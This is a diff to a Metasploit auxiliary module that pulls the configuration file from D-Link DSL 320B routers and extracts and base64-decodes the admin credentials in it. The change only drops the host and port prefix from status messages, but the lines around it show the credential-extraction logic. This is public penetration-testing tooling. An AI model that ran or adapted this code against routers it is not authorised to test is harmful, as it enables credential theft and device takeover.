@@ -33,7 +33,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-    vprint_status("#{rhost}:#{rport} - Trying to access the configuration of the device")
+    vprint_status("Trying to access the configuration of the device")
 
     # download configuration
     res = send_request_cgi({
@@ -47,14 +47,14 @@ class MetasploitModule < Msf::Auxiliary
 
     if res.body =~ /sysPassword value/ || res.body =~ /sysUserName value/
       if res.body !~ /sysPassword value/
-        print_status("#{rhost}:#{rport} - Default Configuration of DSL 320B detected - no password section available, try admin/admin")
+        print_status("Default Configuration of DSL 320B detected - no password section available, try admin/admin")
       else
-        print_good("#{rhost}:#{rport} - Credentials successfully extracted")
+        print_good("Credentials successfully extracted")
       end
 
       # store all details as loot -> there is some useful stuff in the response
       loot = store_loot('dlink.dsl320b.config', 'text/plain', rhost, res.body)
-      print_good("#{rhost}:#{rport} - Configuration of DSL 320B downloaded to: #{loot}")
+      print_good("Configuration of DSL 320B downloaded to: #{loot}")
 
       user = ''
       pass = ''
@@ -68,7 +68,7 @@ class MetasploitModule < Msf::Auxiliary
 
         pass = ::Regexp.last_match(1)
         pass = Rex::Text.decode_base64(pass)
-        print_good("#{rhost}:#{rport} - Credentials found: #{user} / #{pass}")
+        print_good("Credentials found: #{user} / #{pass}")
 
         connection_details = {
           module_fullname: fullname,
@@ -83,6 +83,6 @@ class MetasploitModule < Msf::Auxiliary
       end
     end
   rescue ::Rex::ConnectionError
-    vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
+    vprint_error("Failed to connect to the web server")
   end
 end
